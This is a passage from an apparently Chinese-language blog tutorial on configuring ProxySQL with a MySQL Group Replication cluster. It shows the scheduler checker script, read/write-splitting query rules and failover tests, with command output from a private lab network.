| comment |</span><br><span class="line">+--------------+-----------------+------+--------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">| 1            | 192.168.219.151 | 3306 | ONLINE | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 1            | 192.168.219.152 | 3306 | ONLINE | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 1            | 192.168.219.153 | 3306 | ONLINE | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 2            | 192.168.219.151 | 3306 | ONLINE | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 2            | 192.168.219.152 | 3306 | ONLINE | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 2            | 192.168.219.153 | 3306 | ONLINE | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">+--------------+-----------------+------+--------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br><span class="line"><span class="meta">#</span><span class="bash">hostgroup_id = 1代表write group，针对我们提出的限制，这个地方只配置了一个节点；</span></span><br><span class="line"><span class="meta">#</span><span class="bash">hostgroup_id = 2代表<span class="built_in">read</span> group，包含了MGR的所有节点,目前只是Onlinle的，等配置过scheduler后，status就会有变化 。</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#</span><span class="bash">对于上面的hostgroup配置，默认所有的写操作会发送到hostgroup_id为1的online节点，也就是发送到写节点上。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">所有的读操作，会发送为hostgroup_id为2的online节点。</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#</span><span class="bash">需要确认一下没有使用proxysql的读写分离规则（因为之前测试中配置了这个地方，所以需要删除，以免影响后面的测试）。</span></span><br><span class="line">MySQL [(none)]&gt;  delete from mysql_query_rules;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; commit;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; LOAD MYSQL VARIABLES TO RUNTIME;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; SAVE MYSQL VARIABLES TO DISK;</span><br><span class="line">Query OK, 94 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; LOAD MYSQL SERVERS TO RUNTIME;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; SAVE MYSQL SERVERS TO DISK;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; LOAD MYSQL USERS TO RUNTIME;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; SAVE MYSQL USERS TO DISK;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; \q</span><br><span class="line">Bye</span><br><span class="line"><span class="meta">#</span><span class="bash">登录验证proxysql登录</span></span><br><span class="line">[root@proxysql-node ~]# mysql -uproxysql -pproxysql -h 127.0.0.1 -P6033 -e"select @@hostname"</span><br><span class="line">+------------+</span><br><span class="line">| @@hostname |</span><br><span class="line">+------------+</span><br><span class="line">| mgr-node3  |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure>

<h5 id="7）配置scheduler"><a href="#7）配置scheduler" class="headerlink" title="7）配置scheduler"></a><strong>7）配置scheduler</strong></h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">有三中脚本，功能如下，网盘中的那个压缩包上传解压即可。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">proxysql_groupreplication_checker.sh：用于multi-primary模式，可以实现读写分离，以及故障切换，同一时间点多个节点可以多写；</span></span><br><span class="line"><span class="meta">#</span><span class="bash">gr_mw_mode_cheker.sh：用于multi-primary模式，可以实现读写分离，以及故障切换，不过在同一时间点只能有一个节点能写；</span></span><br><span class="line"><span class="meta">#</span><span class="bash">gr_sw_mode_checker.sh：用于single-primary模式，可以实现读写分离，以及故障切换；</span></span><br><span class="line"><span class="meta">#</span><span class="bash">由于这里实验的环境是multi-primary模式，所以选择proxysql_groupreplication_checker.sh脚本。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@proxysql-node ~]# ls</span><br><span class="line">anaconda-ks.cfg  proxysql-1.4.8-1-centos7.x86_64.rpm</span><br><span class="line">a.sh             proxysql_groupreplication_checker-master.zip</span><br><span class="line">[root@proxysql-node ~]# unzip proxysql_groupreplication_checker-master.zip</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">将下载的脚本proxysql_groupreplication_checker.sh放到目录/var/lib/proxysql/下，并增加可以执行的权限:</span><br><span class="line">[root@proxysql-node ~]# cd proxysql_groupreplication_checker-master/</span><br><span class="line">[root@proxysql-node proxysql_groupreplication_checker-master]# cp proxysql_groupreplication_checker.sh /var/lib/proxysql/</span><br><span class="line">[root@proxysql-node proxysql_groupreplication_checker-master]# cd </span><br><span class="line">[root@proxysql-node ~]# chmod a+x /var/lib/proxysql/proxysql_groupreplication_checker.sh</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">最后，在proxysql的scheduler表里面加载如下记录，然后加载到RUNTIME使其生效，同时还可以持久化到磁盘:</span></span><br><span class="line">执行语句：</span><br><span class="line">[root@proxysql-node ~]#  mysql -uadmin -padmin -h127.0.0.1 -P6032 </span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 16</span><br><span class="line">Server version: 5.5.30 (ProxySQL Admin Module)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; INSERT INTO scheduler(id,interval_ms,filename,arg1,arg2,arg3,arg4, arg5) VALUES (1,'10000','/var/lib/proxysql/proxysql_groupreplication_checker.sh','1','2','1','0','/var/lib/proxysql/proxysql_groupreplication_checker.log');</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; select * from scheduler;</span><br><span class="line">+----+--------+-------------+--------------------------------------------------------+------+------+------+------+---------------------------------------------</span><br><span class="line">| id | active | interval_ms | filename                                               | arg1 | arg2 | arg3 | arg4 | arg5             | comment |</span><br><span class="line">+----+--------+-------------+--------------------------------------------------------+------+------+------+------+---------------------------------------------</span><br><span class="line">| 1 | 1 | 10000| /var/lib/proxysql/proxysql_groupreplication_checker.sh | 1  | 2  | 1 | 0 | /var/lib/proxysql/proxysql_groupreplication_checker.log |     |</span><br><span class="line">+----+--------+-------------+--------------------------------------------------------+------+------+------+------+---------------------------------------------</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; LOAD SCHEDULER TO RUNTIME;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; SAVE SCHEDULER TO DISK;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">==============================================================================</span><br><span class="line"><span class="meta">#</span><span class="bash">scheduler各column的说明：</span></span><br><span class="line"><span class="meta">#</span><span class="bash">active : 1: <span class="built_in">enable</span> scheduler to schedule the script we provide</span></span><br><span class="line"><span class="meta">#</span><span class="bash">interval_ms : invoke one by one <span class="keyword">in</span> cycle (eg: 5000(ms) = 5s represent every 5s invoke the script)</span></span><br><span class="line"><span class="meta">#</span><span class="bash">filename: represent the script file path</span></span><br><span class="line"><span class="meta">#</span><span class="bash">arg1~arg5: represent the input parameters the script received</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">脚本proxysql_groupreplication_checker.sh对应的参数说明如下:</span></span><br><span class="line"><span class="meta">#</span><span class="bash">arg1 is the hostgroup_id <span class="keyword">for</span> write</span></span><br><span class="line"><span class="meta">#</span><span class="bash">arg2 is the hostgroup_id <span class="keyword">for</span> <span class="built_in">read</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">arg3 is the number of writers we want active at the same time</span></span><br><span class="line"><span class="meta">#</span><span class="bash">arg4 represents <span class="keyword">if</span> we want that the member acting <span class="keyword">for</span> writes is also candidate <span class="keyword">for</span> reads</span></span><br><span class="line"><span class="meta">#</span><span class="bash">arg5 is the <span class="built_in">log</span> file</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">schedule信息加载后，就会分析当前的环境，mysql_servers中显示出当前只有192.168.219.151是可以写的，</span></span><br><span class="line">192.168.219.152以及192.168.219.153是用来读的。</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">会有延迟，没有信息就稍等一会</span></span><br><span class="line">MySQL [(none)]&gt; select * from  mysql_servers ; </span><br><span class="line">+--------------+-----------------+------+--------------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">| hostgroup_id | hostname        | port | status       | weight | compression | max_connections | max_replication_lag | use_ssl | max_latency_ms | comment |</span><br><span class="line">+--------------+-----------------+------+--------------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">| 1            | 192.168.219.151 | 3306 | ONLINE       | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 1            | 192.168.219.152 | 3306 | OFFLINE_SOFT | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 1            | 192.168.219.153 | 3306 | OFFLINE_SOFT | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 2            | 192.168.219.151 | 3306 | OFFLINE_SOFT | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 2            | 192.168.219.152 | 3306 | ONLINE       | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 2            | 192.168.219.153 | 3306 | ONLINE       | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">+--------------+-----------------+------+--------------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br><span class="line"><span class="meta">#</span><span class="bash">因为schedule的arg4，我这里设为了0，就表示可写的节点不能用于读。那我将arg4设置为1试一下：</span></span><br><span class="line">MySQL [(none)]&gt; update scheduler set arg4=1;</span><br><span class="line">Query OK, 1 row affected (0.000 sec)</span><br><span class="line"> </span><br><span class="line">MySQL [(none)]&gt; select * from scheduler;</span><br><span class="line">+----+--------+-------------+--------------------------------------------------------+------+------+------+------+---------------------------------------------</span><br><span class="line">| id | active | interval_ms | filename                                               | arg1 | arg2 | arg3 | arg4 | arg5            | comment |</span><br><span class="line">+----+--------+-------------+--------------------------------------------------------+------+------+------+------+---------------------------------------------</span><br><span class="line">| 1  | 1| 10000| /var/lib/proxysql/proxysql_groupreplication_checker.sh | 1| 2| 1| 1 | /var/lib/proxysql/proxysql_groupreplication_checker.log |         |</span><br><span class="line">+----+--------+-------------+--------------------------------------------------------+------+------+------+------+---------------------------------------------</span><br><span class="line">1 row in set (0.000 sec)</span><br><span class="line"> </span><br><span class="line">MySQL [(none)]&gt; SAVE SCHEDULER TO DISK;</span><br><span class="line">Query OK, 0 rows affected (0.286 sec)</span><br><span class="line"> </span><br><span class="line">MySQL [(none)]&gt; LOAD SCHEDULER TO RUNTIME;</span><br><span class="line">Query OK, 0 rows affected (0.000 sec)</span><br><span class="line"> </span><br><span class="line">MySQL [(none)]&gt; select * from  mysql_servers;</span><br><span class="line">+--------------+-----------------+------+--------------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">| hostgroup_id | hostname        | port | status       | weight | compression | max_connections | max_replication_lag | use_ssl | max_latency_ms | comment |</span><br><span class="line">+--------------+-----------------+------+--------------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">| 1            | 192.168.219.151 | 3306 | ONLINE       | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 1            | 192.168.219.152 | 3306 | OFFLINE_SOFT | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 1            | 192.168.219.153 | 3306 | OFFLINE_SOFT | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 2            | 192.168.219.151 | 3306 | ONLINE       | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 2            | 192.168.219.152 | 3306 | ONLINE       | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 2            | 192.168.219.153 | 3306 | ONLINE       | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">+--------------+-----------------+------+--------------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br><span class="line"> </span><br><span class="line">arg4设置为1之后，192.168.219.151节点用来写的同时，也可以被用来读。</span><br><span class="line"> </span><br><span class="line">便于下面的测试还是将arg4设为0：</span><br><span class="line">MySQL [(none)]&gt; update scheduler set arg4=0;</span><br><span class="line">Query OK, 1 row affected (0.000 sec)</span><br><span class="line"> </span><br><span class="line">MySQL [(none)]&gt; SAVE SCHEDULER TO DISK;</span><br><span class="line">Query OK, 0 rows affected (0.197 sec)</span><br><span class="line"> </span><br><span class="line">MySQL [(none)]&gt; LOAD SCHEDULER TO RUNTIME;</span><br><span class="line">Query OK, 0 rows affected (0.000 sec)</span><br><span class="line"> </span><br><span class="line">MySQL [(none)]&gt; select * from  mysql_servers;</span><br><span class="line">+--------------+-----------------+------+--------------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">| hostgroup_id | hostname        | port | status       | weight | compression | max_connections | max_replication_lag | use_ssl | max_latency_ms | comment |</span><br><span class="line">+--------------+-----------------+------+--------------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">| 1            | 192.168.219.151 | 3306 | ONLINE       | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 1            | 192.168.219.152 | 3306 | OFFLINE_SOFT | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 1            | 192.168.219.153 | 3306 | OFFLINE_SOFT | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 2            | 192.168.219.151 | 3306 | OFFLINE_SOFT | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 2            | 192.168.219.152 | 3306 | ONLINE       | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 2            | 192.168.219.153 | 3306 | ONLINE       | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">+--------------+-----------------+------+--------------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">各个节点的gr_member_routing_candidate_status视图也显示了当前节点是否是正常状态的，</span></span><br><span class="line"><span class="meta">#</span><span class="bash">proxysql就是读取的这个视图的信息来决定此节点是否可用。</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from sys.gr_member_routing_candidate_status\G;</span></span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">    viable_candidate: YES</span><br><span class="line">           read_only: NO</span><br><span class="line"> transactions_behind: 0</span><br><span class="line">transactions_to_cert: 0</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">ERROR: </span><br><span class="line">No query specified</span><br></pre></td></tr></table></figure>

<h5 id="8-设置读写分离"><a href="#8-设置读写分离" class="headerlink" title="8) 设置读写分离"></a><strong>8) 设置读写分离</strong></h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">MySQL [(none)]&gt; insert into mysql_query_rules (active, match_pattern, destination_hostgroup, apply) values (1,"^SELECT",2,1);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; LOAD MYSQL QUERY RULES TO RUNTIME;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; SAVE MYSQL QUERY RULES TO DISK;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">解释说明:</span></span><br><span class="line"><span class="meta">#</span><span class="bash">match_pattern的规则是基于正则表达式的，</span></span><br><span class="line"><span class="meta">#</span><span class="bash">active表示是否启用这个sql路由项，</span></span><br><span class="line"><span class="meta">#</span><span class="bash">match_pattern就是我们正则匹配项，</span></span><br><span class="line"><span class="meta">#</span><span class="bash">destination_hostgroup表示我们要将该类sql转发到哪些mysql上面去，这里我们将select转发到group 2，。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">apply为1表示该正则匹配后，将不再接受其他匹配，直接转发。</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">对于<span class="keyword">for</span> update需要在gruop1上执行，可以加上规则：</span></span><br><span class="line">MySQL [(none)]&gt; insert into mysql_query_rules(active,match_pattern,destination_hostgroup,apply) values(1,'^SELECT.*FOR UPDATE$',1,1);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"> </span><br><span class="line">在proxysql本机或其他客户机上检查下，select 语句，一直连接的是192.168.219.152和192.168.219.153</span><br><span class="line">[root@mgr-node3 ~]# mysql -uproxysql -pproxysql -h192.168.219.154 -P6033 -e "select @@hostname"</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">+------------+</span><br><span class="line">| @@hostname |</span><br><span class="line">+------------+</span><br><span class="line">| mgr-node3  |</span><br><span class="line">+------------+</span><br><span class="line">[root@mgr-node3 ~]# mysql -uproxysql -pproxysql -h192.168.219.154 -P6033 -e "select @@hostname"</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">+------------+</span><br><span class="line">| @@hostname |</span><br><span class="line">+------------+</span><br><span class="line">| mgr-node2  |</span><br><span class="line">+------------+</span><br><span class="line">[root@mgr-node3 ~]# mysql -uproxysql -pproxysql -h192.168.219.154 -P6033 -e "select @@hostname"</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">+------------+</span><br><span class="line">| @@hostname |</span><br><span class="line">+------------+</span><br><span class="line">| mgr-node2  |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure>

<h5 id="9-验证数据的读写分离效果"><a href="#9-验证数据的读写分离效果" class="headerlink" title="9) 验证数据的读写分离效果"></a><strong>9) 验证数据的读写分离效果</strong></h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@proxysql-node ~]# mysql -uproxysql -pproxysql -h192.168.219.154 -P6033 -e "select @@hostname"  </span><br><span class="line">+------------+</span><br><span class="line">| @@hostname |</span><br><span class="line">+------------+</span><br><span class="line">| mgr-node2  |</span><br><span class="line">+------------+</span><br><span class="line">[root@proxysql-node ~]# mysql -uproxysql -pproxysql -h192.168.219.154 -P6033 -e "select @@hostname"  </span><br><span class="line">+------------+</span><br><span class="line">| @@hostname |</span><br><span class="line">+------------+</span><br><span class="line">| mgr-node3  |</span><br><span class="line">+------------+</span><br><span class="line">[root@proxysql-node ~]# mysql -uproxysql -pproxysql -h192.168.219.154 -P6033 -e "select @@hostname"  </span><br><span class="line">+------------+</span><br><span class="line">| @@hostname |</span><br><span class="line">+------------+</span><br><span class="line">| mgr-node2  |</span><br><span class="line">+------------+</span><br><span class="line">[root@proxysql-node ~]# mysql -uproxysql -pproxysql -h192.168.219.154 -P6033 -e "select @@hostname"  </span><br><span class="line">+------------+</span><br><span class="line">| @@hostname |</span><br><span class="line">+------------+</span><br><span class="line">| mgr-node2  |</span><br><span class="line">+------------+</span><br><span class="line">[root@proxysql-node ~]# mysql -uproxysql -pproxysql -h192.168.219.154 -P6033 -e "select @@hostname"  </span><br><span class="line">+------------+</span><br><span class="line">| @@hostname |</span><br><span class="line">+------------+</span><br><span class="line">| mgr-node3  |</span><br><span class="line">+------------+</span><br><span class="line">[root@proxysql-node ~]#  mysql -uproxysql -pproxysql -h192.168.219.154 -P6033 -e "select * from kevin.haha"</span><br><span class="line">+-----+-----------+</span><br><span class="line">| id  | name      |</span><br><span class="line">+-----+-----------+</span><br><span class="line">|   1 | wangshibo |</span><br><span class="line">|   2 | guohuihui |</span><br><span class="line">|  11 | beijing   |</span><br><span class="line">| 100 | anhui     |</span><br><span class="line">+-----+-----------+</span><br><span class="line">[root@proxysql-node ~]#  mysql -uproxysql -pproxysql -h192.168.219.154 -P6033 -e "delete from kevin.haha where id=1;"</span><br><span class="line">[root@proxysql-node ~]#  mysql -uproxysql -pproxysql -h192.168.219.154 -P6033 -e "delete from kevin.haha where id=2;"</span><br><span class="line">[root@proxysql-node ~]#  mysql -uproxysql -pproxysql -h192.168.219.154 -P6033 -e "select * from kevin.haha"</span><br><span class="line">+-----+---------+</span><br><span class="line">| id  | name    |</span><br><span class="line">+-----+---------+</span><br><span class="line">|  11 | beijing |</span><br><span class="line">| 100 | anhui   |</span><br><span class="line">+-----+---------+</span><br><span class="line">[root@proxysql-node ~]#  mysql -uproxysql -pproxysql -h192.168.219.154 -P6033 -e 'insert into kevin.haha values(21,"zhongguo"),(22,"xianggang"),(23,"taiwan");'</span><br><span class="line">[root@proxysql-node ~]#  mysql -uproxysql -pproxysql -h192.168.219.154 -P6033 -e "select * from kevin.haha"</span><br><span class="line">+-----+-----------+</span><br><span class="line">| id  | name      |</span><br><span class="line">+-----+-----------+</span><br><span class="line">|  11 | beijing   |</span><br><span class="line">|  21 | zhongguo  |</span><br><span class="line">|  22 | xianggang |</span><br><span class="line">|  23 | taiwan    |</span><br><span class="line">| 100 | anhui     |</span><br><span class="line">+-----+-----------+</span><br><span class="line"><span class="meta">#</span><span class="bash">最后在proxysql管理端查看读写分离情况</span></span><br><span class="line">[root@proxysql-node ~]# mysql -uadmin -p"admin" -h127.0.0.1 -P6032</span><br><span class="line">...........</span><br><span class="line">MySQL [(none)]&gt; select hostgroup,username,digest_text,count_star from stats_mysql_query_digest;</span><br><span class="line">+-----------+----------+--------------------------------------------------------------------+------------+</span><br><span class="line">| hostgroup | username | digest_text                                                        | count_star |</span><br><span class="line">+-----------+----------+--------------------------------------------------------------------+------------+</span><br><span class="line">| 1         | proxysql | insert into kevin.haha values(?,zhongguo),(?,xianggang),(?,taiwan) | 1          |</span><br><span class="line">| 1         | proxysql | delete from kevin.haha where id=?                                  | 2          |</span><br><span class="line">| 1         | proxysql | insert into kevin.haha values(?,?),(?,?),(?,?)                     | 1          |</span><br><span class="line">| 2         | proxysql | select * from kevin.haha                                           | 3          |</span><br><span class="line">| 2         | proxysql | select @@hostname                                                  | 12         |</span><br><span class="line">| 1         | proxysql | select @@hostname                                                  | 9          |</span><br><span class="line">| 1         | proxysql | select @@version_comment limit ?                                   | 28         |</span><br><span class="line">+-----------+----------+--------------------------------------------------------------------+------------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; select * from  mysql_servers;</span><br><span class="line">+--------------+-----------------+------+--------------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">| hostgroup_id | hostname        | port | status       | weight | compression | max_connections | max_replication_lag | use_ssl | max_latency_ms | comment |</span><br><span class="line">+--------------+-----------------+------+--------------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">| 1            | 192.168.219.151 | 3306 | ONLINE       | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 1            | 192.168.219.152 | 3306 | OFFLINE_SOFT | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 1            | 192.168.219.153 | 3306 | OFFLINE_SOFT | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 2            | 192.168.219.151 | 3306 | OFFLINE_SOFT | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 2            | 192.168.219.152 | 3306 | ONLINE       | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 2            | 192.168.219.153 | 3306 | ONLINE       | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">+--------------+-----------------+------+--------------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br><span class="line"><span class="meta">#</span><span class="bash">通过上面可以看到：</span></span><br><span class="line"><span class="meta">#</span><span class="bash">写操作都分配到了group1组内，即写操作分配到192.168.219.151节点上。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">读操作都分配到了group2组内，即读操作分配到192.168.219.152,192.168.219.153节点上。</span></span><br></pre></td></tr></table></figure>

<h5 id="10）设置故障应用无感应"><a href="#10）设置故障应用无感应" class="headerlink" title="10）设置故障应用无感应"></a><strong>10）设置故障应用无感应</strong></h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">在上面的读写分离规则中，我设置了192.168.219.151为可写节点，192.168.219.152,192.168.219.153为只读节点</span></span><br><span class="line"><span class="meta">#</span><span class="bash">如果此时192.168.219.151变成只读模式的话，应用能不能直接连到其它的节点进行写操作？</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#</span><span class="bash">现手动将192.168.219.151变成只读模式：</span></span><br><span class="line">[root@mgr-node1 ~]# mysql -uroot -p"123456"</span><br><span class="line">........</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">set</span> global read_only=1;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"><span class="meta">#</span><span class="bash">接着观察一下mysql_servers的状态，自动将group1的192.168.219.152改成了online，group2的192.168.219.151,192.168.219.153变成online了，就表示将192.168.219.152变为可写节点，其它两个节点变为只读节点了。</span></span><br><span class="line">[root@proxysql-node ~]# mysql -uadmin -padmin -h 127.0.0.1 -P6032</span><br><span class="line">........</span><br><span class="line">MySQL [(none)]&gt; select * from  mysql_servers;</span><br><span class="line">+--------------+-----------------+------+--------------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">| hostgroup_id | hostname        | port | status       | weight | compression | max_connections | max_replication_lag | use_ssl | max_latency_ms | comment |</span><br><span class="line">+--------------+-----------------+------+--------------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">| 1            | 192.168.219.151 | 3306 | OFFLINE_SOFT | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 1            | 192.168.219.152 | 3306 | ONLINE       | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 1            | 192.168.219.153 | 3306 | OFFLINE_SOFT | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 2            | 192.168.219.151 | 3306 | ONLINE       | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 2            | 192.168.219.152 | 3306 | OFFLINE_SOFT | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 2            | 192.168.219.153 | 3306 | ONLINE       | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">+--------------+-----------------+------+--------------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br><span class="line"><span class="meta">#</span><span class="bash">通过模拟的连接也可以看到select语句都连接到192.168.219.151和192.168.219.153进行了。 (模拟时可以稍微间隔一段时间，快速测试可能会连接同一个读节点)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@mgr-node3 ~]# mysql -uproxysql -pproxysql -h192.168.219.154 -P6033 -e "select @@hostname"</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">+------------+</span><br><span class="line">| @@hostname |</span><br><span class="line">+------------+</span><br><span class="line">| mgr-node1  |</span><br><span class="line">+------------+</span><br><span class="line">[root@mgr-node3 ~]# mysql -uproxysql -pproxysql -h192.168.219.154 -P6033 -e "select @@hostname"</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">+------------+</span><br><span class="line">| @@hostname |</span><br><span class="line">+------------+</span><br><span class="line">| mgr-node3  |</span><br><span class="line">+------------+</span><br><span class="line">[root@mgr-node3 ~]# mysql -uproxysql -pproxysql -h192.168.219.154 -P6033 -e "select @@hostname"</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">+------------+</span><br><span class="line">| @@hostname |</span><br><span class="line">+------------+</span><br><span class="line">| mgr-node1  |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure>

